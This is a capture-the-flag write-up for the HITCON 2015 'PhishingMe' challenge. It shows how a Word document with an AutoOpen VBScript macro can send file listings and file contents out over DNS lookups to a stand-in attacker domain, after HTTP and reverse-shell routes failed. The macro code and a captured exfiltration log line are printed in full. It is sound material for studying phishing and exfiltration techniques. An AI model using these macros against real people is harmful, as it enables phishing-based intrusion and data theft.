#PhishingMe - Misc 200 Problem - Writeup by Erye Hernandez (@eryeh)

###Description
```
Sent me a .doc, I will open it if your subject is "HITCON 2015"!
Find the flag under my file system. 
p.s. I've enabled Macro for you. ^_________________^
phishing.me.hitcon.2015@gmail.com.
```
Based on the description and problem title, the goal of this challenge is to email a malicious document to `phishing.me.hitcon.2015@gmail.com` which will somehow exfiltrate the file that contains the flag from their system. 


###Walkthrough
Given this information, the first impulse is to quickly create a malicious document using `Metasploit` (more info [here](https://www.offensive-security.com/metasploit-unleashed/vbscript-infection-methods/)). `Metasploit` automagically creates `VBScript` code and a `reverse tcp shell` payload that you just copy and paste to your Word document. This payload gives us a shell into their system so we can easily navigate and find the text file containing the flag. Despite this method working locally when we tested it, it does not solve the problem. This means that the remote system has some kind of firewall that blocks outgoing traffic. Since this is a `200 pt` problem, it makes sense that solving it would require a bit more work.


####Creating a macro in Word
Since this challenge requires using macros in a Word document to complete the challenge, we outline the steps of creating macros below. 

If using MS Word 2003, click on `Tools` then `Macros` and then finally `Macros`. 
![MS Word 2003](https://github.com/pwning/public-writeup/blob/master/hitcon2015/misc200-phishingme/office_2003.png)

If using MS Word 2007, click on `View` then `Macros` and thenn finally `View Macros`.
![MS Word 2007](https://github.com/pwning/public-writeup/blob/master/hitcon2015/misc200-phishingme/office_2007.png)

Create a macro named `AutoOpen` in the `macro` dialog box and it will launch the `Visual Basic Editor` where you can create and debug your `macros`.
![macro dialog box](https://github.com/pwning/public-writeup/blob/master/hitcon2015/misc200-phishingme/macro_dialog.png)


####So how do we exfil all the data?  

When the `reverse shell` payload route failed, we decide to find alternatives to exfiltrating data. Since `TCP port 80` is a common port that is not blocked, we first explore the possibility of getting data out using plain old `HTTP`. We use the script below to check if `outgoing` traffic on `TCP port 80` is possible.

```vb
Sub AutoOpen()
  Dim objHttp: Set objHttp = CreateObject("Microsoft.XMLHTTP")

  uri = "http://X.X.X.X/poop/"
  objHttp.Open "GET", uri, False
  objHttp.send
End Sub
```

Since we did not see any connections to our web server when we sent this script, we can safely assume that `outgoing` traffic on `TCP port 80` is also blocked. Next, we check if `DNS` traffic is blocked by using the script below.

```vb
Sub AutoOpen()
  Dim objShell: Set objShell = CreateObject("WScript.Shell")
  objShell.Exec ("%comspec% /c nslookup tun.mydomain.com")
End Sub
```

We see their server connecting to ours so this is good news! The above script also tells us that it is possible to issue command line instructions to the system via `VBScript`. We can use `DNS` requests to exfiltrate data from their system. Now, we have to figure out where the flag is located. 


####Capturing the flag
We created the `VBScript` below to help with the task of finding the flag in the remote system. Since we are using `DNS` lookup queries, we have to make sure that there are no `whitespaces` in the data that is sent as a `DNS` query so we replace `whitespaces` with an `underscore` ("_"). Although not necessary, we also replace the occurences of `periods` (".") with an `underscore`. We decide to first do a file listing of the current working directory as this would be the most logical place for the flag file to be.

```vb
Sub AutoOpen()
  Dim objShell: Set objShell = CreateObject("WScript.Shell")
  Dim objFSO: Set objFSO = CreateObject("Scripting.FileSystemObject")
  Dim objFolder: Set objFolder = objFSO.GetFolder(".")
  
  objShell.Exec ("%comspec% /c nslookup " & objFolder.Path & ".tun.mydomain.com")
  
  Set colFiles = objFolder.Files
  buff = ""
  For Each objFile In colFiles
    buff = Replace(objFile.Name, " ", "_")
    buff = Replace(buff, ".", "_")
    objShell.Exec ("%comspec% /c nslookup " & buff & ".tun.mydomain.com")
  Next
End Sub
```

Once we got our results back, we notice a file called `secret.txt`. This file sounds promising so we open the file and send the contents back through `DNS` query. Here is what the traffic looks like with the flag (`hitcon{m4cr0_ma1ware_1s_m4k1ng_a_c0meb4ck!!}`)

```
17:40:10.859126 IP ec2-54-199-14-224.ap-northeast-1.compute.amazonaws.com.24390 > ns4009839.ip-192-99-5.net.domain: 22447 [1au] AAAA? hitcon{m4cr0_ma1ware_1s_m4k1ng_a_c0meb4ck!!}.tun.mydomain.com. (93)
```

Yay! We are done! It is surprising to note however that `DNS` queries actually allow `{` and `!` characters. The final (cleaned up) macro can be found [here](https://github.com/pwning/public-writeup/blob/master/hitcon2015/misc200-phishingme/macro.vbs).
